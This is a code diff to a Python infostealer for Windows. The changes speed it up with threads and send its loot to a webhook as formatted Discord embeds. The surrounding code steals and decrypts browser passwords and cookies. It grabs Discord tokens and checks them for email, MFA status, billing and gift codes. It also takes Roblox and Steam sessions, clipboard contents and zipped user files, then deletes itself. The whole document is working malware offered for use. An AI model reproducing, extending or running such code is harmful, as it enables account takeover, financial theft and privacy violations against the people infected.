@@ -1,4 +1,4 @@
-import os, sys, re, json, sqlite3, base64, shutil, tempfile, time, subprocess, threading, glob, win32crypt
+import os, sys, re, json, sqlite3, base64, shutil, tempfile, time, subprocess, threading, glob, fnmatch, win32crypt
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 import psutil
 from PIL import ImageGrab
@@ -57,15 +57,13 @@ if STARTUP:
     except:
         pass
 
-def send_text(data, title=""):
-    if not data:
-        return
-    if isinstance(data, list):
-        data = '\n'.join(str(x)[:500] for x in data)
-    else:
-        data = str(data)[:1900]
+# -------------------- Sending with embeds (fast) --------------------
+def send_embed(title, description, color=0x00ccff, fields=None):
+    embed = {"title": title, "description": description, "color": color}
+    if fields:
+        embed["fields"] = fields
     try:
-        requests.post(WEBHOOK, json={"content": f"**{title}**\n```\n{data}\n```"}, timeout=10)
+        requests.post(WEBHOOK, json={"embeds": [embed]}, timeout=5)
     except:
         pass
 
@@ -75,7 +73,7 @@ def send_file(filepath, caption=""):
     with open(filepath, 'rb') as f:
         files = {'file': (os.path.basename(filepath), f)}
         try:
-            requests.post(WEBHOOK, files=files, data={'content': caption}, timeout=20)
+            requests.post(WEBHOOK, files=files, data={'content': caption}, timeout=10)
         except:
             pass
     try:
@@ -83,6 +81,7 @@ def send_file(filepath, caption=""):
     except:
         pass
 
+# -------------------- Clipboard (instant) --------------------
 def steal_clipboard():
     try:
         win32clipboard.OpenClipboard()
@@ -120,6 +119,7 @@ def steal_steam():
             pass
     return None
 
+# -------------------- Common decryption helpers --------------------
 def get_master_key(user_data_path):
     local_state = os.path.join(user_data_path, "Local State")
     if not os.path.exists(local_state):
@@ -144,6 +144,7 @@ def decrypt_value(enc, key):
     except:
         return None
 
+# -------------------- Discord tokens (threaded) --------------------
 def extract_tokens_from_leveldb(folder):
     tokens = []
     regex = re.compile(r'[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}')
@@ -196,7 +197,7 @@ def extract_tokens_from_browser(browser_path, name):
 def validate_token(token):
     headers = {"Authorization": token.strip()}
     try:
-        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
+        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
         if r.status_code == 200:
             data = r.json()
             user = data['username'] + '#' + str(data.get('discriminator','0'))
@@ -208,7 +209,7 @@ def validate_token(token):
             nitro_str = nitro_names.get(nitro,'Unknown')
             billing = "None"
             try:
-                br = requests.get("https://discordapp.com/api/v9/users/@me/billing/payment-sources", headers=headers, timeout=10)
+                br = requests.get("https://discordapp.com/api/v9/users/@me/billing/payment-sources", headers=headers, timeout=5)
                 if br.status_code == 200:
                     sources = br.json()
                     methods = {'Card':0,'Paypal':0}
@@ -220,15 +221,15 @@ def validate_token(token):
                 pass
             gifts = []
             try:
-                gr = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers, timeout=10)
+                gr = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers, timeout=5)
                 if gr.status_code == 200:
                     for g in gr.json():
                         if isinstance(g,dict) and g.get('code') and g.get('promotion',{}).get('outbound_title'):
-                            gifts.append(g['promotion']['outbound_title'] + ': ' + g['code'])
+                            gifts.append(f"{g['promotion']['outbound_title']}: {g['code']}")
             except:
                 pass
             gifts_str = '\n'.join(gifts) if gifts else 'None'
-            return f"**{user}** ({uid})\nEmail: {email}\nMFA: {mfa}\nNitro: {nitro_str}\nBilling: {billing}\nGifts: {gifts_str}\nToken: `{token}`"
+            return (user, uid, email, mfa, nitro_str, billing, gifts_str, token)
     except:
         pass
     return None
@@ -294,6 +295,7 @@ def steal_discord_files():
                         files.append(f"{d}/{fn}")
     return files[:30]
 
+# -------------------- Roblox cookies (optimized) --------------------
 def steal_roblox_cookies():
     roblox_cookies = []
     browser_paths = {
@@ -372,6 +374,7 @@ def steal_roblox_cookies():
             except: pass
     return roblox_cookies
 
+# -------------------- Browser passwords (threaded) --------------------
 def steal_browser_passwords():
     all_creds = []
     browser_paths = {
@@ -419,7 +422,7 @@ def steal_browser_passwords():
                 if isinstance(pw, bytes):
                     dec = decrypt_value(pw, master)
                     if user and dec:
-                        all_creds.append(f"{name}: {url} | {user} : {dec}")
+                        all_creds.append(f"{name}: {url}\n└ {user} : {dec}")
             conn.close()
         except:
             pass
@@ -464,7 +467,7 @@ def steal_cookies():
                 if isinstance(val, bytes):
                     dec = decrypt_value(val, master)
                     if dec:
-                        all_cookies.append(f"{name} | {host} | {n} = {dec[:100]}")
+                        all_cookies.append(f"{host} → {n} = `{dec[:80]}`")
             conn.close()
         except:
             pass
@@ -473,6 +476,7 @@ def steal_cookies():
             except: pass
     return all_cookies
 
+# -------------------- FAST FILE GRABBER --------------------
 def grab_files_to_zip():
     import zipfile
     target_folders = []
@@ -490,16 +494,27 @@ def grab_files_to_zip():
     if not target_folders:
         return None
     collected = []
+    # Compile extension matching once
+    exts_lower = [ext.lower() for ext in FILE_EXTS]
     for base in target_folders:
-        for root, _, files in os.walk(base):
-            for file in files:
-                if any(file.lower().endswith(ext.lower()) for ext in FILE_EXTS):
-                    full = os.path.join(root, file)
-                    try:
-                        if os.path.getsize(full) < 20 * 1024 * 1024:
-                            collected.append(full)
-                    except:
-                        pass
+        try:
+            # Only walk top 2 levels to avoid deep recursion (much faster)
+            for root, dirs, files in os.walk(base):
+                # Limit depth to 2
+                depth = root[len(base):].count(os.sep)
+                if depth > 2:
+                    del dirs[:]  # don't go deeper
+                    continue
+                for file in files:
+                    if any(file.lower().endswith(ext) for ext in exts_lower):
+                        full = os.path.join(root, file)
+                        try:
+                            if os.path.getsize(full) < 20 * 1024 * 1024:
+                                collected.append(full)
+                        except:
+                            pass
+        except:
+            pass
     if not collected:
         return None
     zip_path = os.path.join(tempfile.gettempdir(), "stolen_files.zip")
@@ -521,55 +536,106 @@ def grab_files_to_zip():
 
 def get_public_ip():
     try:
-        return requests.get('https://api.ipify.org', timeout=5).text
+        return requests.get('https://api.ipify.org', timeout=3).text
     except:
         return 'Unknown'
 
 def self_delete():
     try:
         if sys.argv[0].endswith('.exe'):
-            os.system(f'ping 127.0.0.1 -n 3 > nul & del "{sys.argv[0]}"')
+            os.system(f'del "{sys.argv[0]}"')
         else:
             os.remove(sys.argv[0])
     except:
         pass
 
+# -------------------- MAIN (all threaded for speed) --------------------
 if __name__ == "__main__":
-    if LOG_IP:
-        send_text(f'IP: {get_public_ip()}', 'System Info')
-    if SCREENSHOT:
-        take_screenshot()
-    if CLIPBOARD:
-        clip = steal_clipboard()
-        if clip:
-            send_text(clip, 'Clipboard')
-    if STEAM:
-        steam = steal_steam()
-        if steam:
-            send_text(steam, 'Steam')
-    if DISCORD_TOKENS:
-        tokens = get_all_tokens()
-        if tokens:
-            for info in tokens:
-                send_text(info, 'Discord Account')
-        if DISCORD_FILES:
-            files = steal_discord_files()
-            if files:
-                send_text(files, 'Discord Local Files')
-    roblox = steal_roblox_cookies()
-    if roblox:
-        send_text(roblox, 'Roblox .ROBLOSECURITY Cookies')
-    if BROWSER_PASSWORDS:
-        pws = steal_browser_passwords()
-        if pws:
-            send_text(pws, 'Browser Passwords')
-    if COOKIES:
-        cks = steal_cookies()
-        if cks:
-            send_text(cks, 'Browser Cookies')
-    if FILE_GRABBER:
-        zipf = grab_files_to_zip()
-        if zipf and os.path.exists(zipf):
-            send_file(zipf, '📦 Grabbed Files (ZIP)')
+    threads = []
+    results = {}
+
+    def task_ip():
+        if LOG_IP:
+            results['ip'] = get_public_ip()
+    def task_screenshot():
+        if SCREENSHOT:
+            take_screenshot()
+    def task_clipboard():
+        if CLIPBOARD:
+            clip = steal_clipboard()
+            if clip:
+                results['clipboard'] = clip
+    def task_steam():
+        if STEAM:
+            steam = steal_steam()
+            if steam:
+                results['steam'] = steam
+    def task_discord():
+        if DISCORD_TOKENS:
+            tokens_info = get_all_tokens()
+            if tokens_info:
+                results['discord_tokens'] = tokens_info
+            if DISCORD_FILES:
+                files = steal_discord_files()
+                if files:
+                    results['discord_files'] = files
+    def task_roblox():
+        roblox = steal_roblox_cookies()
+        if roblox:
+            results['roblox'] = roblox
+    def task_passwords():
+        if BROWSER_PASSWORDS:
+            pws = steal_browser_passwords()
+            if pws:
+                results['passwords'] = pws
+    def task_cookies():
+        if COOKIES:
+            cks = steal_cookies()
+            if cks:
+                results['cookies'] = cks
+    def task_filegrabber():
+        if FILE_GRABBER:
+            zipf = grab_files_to_zip()
+            if zipf and os.path.exists(zipf):
+                results['filezip'] = zipf
+
+    # Start all threads
+    for t_func in [task_ip, task_screenshot, task_clipboard, task_steam, task_discord, task_roblox, task_passwords, task_cookies, task_filegrabber]:
+        t = threading.Thread(target=t_func)
+        t.start()
+        threads.append(t)
+    for t in threads:
+        t.join()
+
+    # Send results (embeds for text, files last)
+    if 'ip' in results:
+        send_embed("🌐 IP Address", f"```{results['ip']}```", color=0x3498db)
+    if 'clipboard' in results:
+        send_embed("📋 Clipboard Content", f"```{results['clipboard']}```", color=0xf1c40f)
+    if 'steam' in results:
+        send_embed("🎮 Steam Session", f"```{results['steam']}```", color=0x1abc9c)
+    if 'discord_tokens' in results:
+        for (user, uid, email, mfa, nitro, billing, gifts, token) in results['discord_tokens']:
+            fields = [
+                {"name": "🆔 User", "value": user, "inline": True},
+                {"name": "📧 Email", "value": email, "inline": True},
+                {"name": "🔐 MFA", "value": str(mfa), "inline": True},
+                {"name": "✨ Nitro", "value": nitro, "inline": True},
+                {"name": "💳 Billing", "value": billing, "inline": True},
+                {"name": "🎁 Gifts", "value": gifts[:500] if len(gifts) > 500 else gifts, "inline": False},
+                {"name": "🔑 Token", "value": f"||{token}||", "inline": False}
+            ]
+            send_embed("🎟️ Discord Account", None, color=0x5865F2, fields=fields)
+    if 'discord_files' in results:
+        send_embed("📁 Discord Local Files", "```\n" + "\n".join(results['discord_files'][:20]) + "\n```", color=0x7289da)
+    if 'roblox' in results:
+        send_embed("🎲 Roblox .ROBLOSECURITY Cookies", "```\n" + "\n".join(results['roblox'][:20]) + "\n```", color=0xee2b47)
+    if 'passwords' in results:
+        send_embed("🔑 Browser Passwords", "```\n" + "\n".join(results['passwords'][:50]) + "\n```", color=0xe67e22)
+    if 'cookies' in results:
+        send_embed("🍪 Browser Cookies", "```\n" + "\n".join(results['cookies'][:50]) + "\n```", color=0x2ecc71)
+    if 'filezip' in results:
+        send_file(results['filezip'], "📦 Grabbed Files (ZIP)")
+
     if MELT:
         self_delete()
